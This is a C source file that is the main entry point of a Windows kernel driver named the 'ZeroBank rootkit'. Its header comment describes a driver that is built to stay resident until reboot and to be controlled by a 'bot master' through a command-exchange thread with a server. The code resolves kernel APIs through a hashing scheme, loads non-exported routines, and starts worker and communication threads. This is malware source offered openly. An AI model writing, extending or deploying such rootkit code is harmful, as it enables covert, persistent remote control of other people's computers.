#include "common.h"

/*///////////////////////////////////////////////////////////
//
//	File: ZeroBank.c
//
//	Main entry point of the ZeroBank rootkit
//
//	- Initialization of synchronization objects
//	- Thread Creation for the different routines
//	that will give sense for the rootkit activity
//
//	- Rootkit Final version wont have an Unload Routine
//	for remote host safeness, since unloading this type
//	of drivers can cause many problems, driver will always
//  stay active in memory until system shutdowns or reboots
//	What the bot master can do is terminate the communication
//	thread, which will terminate the command exchange with
//	server, but even doing that the rootkit will be still active
//
*/////////////////////////////////////////////////////////////

KSPIN_LOCK g_globalspinlock = { 0 };
KIRQL Irql = { 0 };
PDRIVER_OBJECT g_pDriverObject = NULL;
ROOTKIT_API_HASH g_Hash = { 0 };
ZEROBANK_COMMUNICATION_CTX Ctx = { 0 };
ERESOURCE g_globalresource = { 0 };
char g_idpath[255] = { 0 };

VOID Unload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("\n__ZeroBank__rootkit__unloaded");
	
	ExDeleteResourceLite(&g_globalresource);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING RegisterPath)
{
	DbgPrint("\n__ZeroBank__rootkit__loaded");

	NTSTATUS st;
	HANDLE info_handle;
	HANDLE flt;
	HANDLE proc_handle;
	PZEROBANK_COMMUNICATION_CTX ctx = NULL;

	g_pDriverObject = pDriverObject;

	// Load funtion hashing system

	KiLoadFunctions(&g_Hash);

	// initialize globals

	KzInitializeSpinLock(&g_globalspinlock);
	ExInitializeResourceLite(&g_globalresource);

	// Initialize rootkit worker threads, dynamic data and non exported procedures

	KiInitializeKernelModeThread(&info_handle, &g_Hash, rootkit_dynamic_data_thread, (PROOTKIT_API_HASH)&g_Hash);
	KiInitializeKernelModeThread(&proc_handle, &g_Hash, KiLoadNonExportedRoutines, (PROOTKIT_API_HASH)&g_Hash);


	// alloc memory for communication context thread
	// and pass parameters needed for further operations

	ctx = (PZEROBANK_COMMUNICATION_CTX)g_Hash._ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_COMMUNICATION_CTX));
	memset(ctx, 0, sizeof(ZEROBANK_COMMUNICATION_CTX));
	ctx->g_Hash = &g_Hash;
	ctx->pDriverObjectCtx = pDriverObject;

	// start thread

	st = zerobank_init_communication_thread(ctx);


	pDriverObject->DriverUnload = Unload;


	return STATUS_SUCCESS;


}

